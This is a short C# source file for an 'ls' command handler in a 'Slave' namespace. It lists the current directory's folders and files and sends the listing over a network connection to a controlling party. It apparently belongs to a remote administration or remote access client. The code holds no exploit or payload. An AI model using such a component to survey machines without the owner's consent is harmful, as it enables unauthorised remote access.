using Shared;
using System.Collections.Generic;
using System.IO;

namespace Slave.Commands.Core
{
    internal class LS : ICommand
    {
        public string name { get; set; } = "ls";

        public void Process(List<string> args)
        {
            var result = "";
            var cwd = Directory.GetCurrentDirectory();
            foreach (var dir in Directory.GetDirectories(cwd))
            {
                var dirInfo = new DirectoryInfo(dir);
                result += $"{dirInfo.LastWriteTime:MM/dd/yy  HH:mm:ss}   <DIR>   {dirInfo.Name}\n";
            }
            foreach (var file in Directory.GetFiles(cwd))
            {
                var fileInfo = new DirectoryInfo(file);
                result += $"{fileInfo.LastWriteTime:MM/dd/yy  HH:mm:ss}           {fileInfo.Name}\n";
            }

            SlaveCommandsManager.networkManager.WriteLine(result);
            SlaveCommandsManager.networkManager.WriteLine("{end}");
        }
    }
}
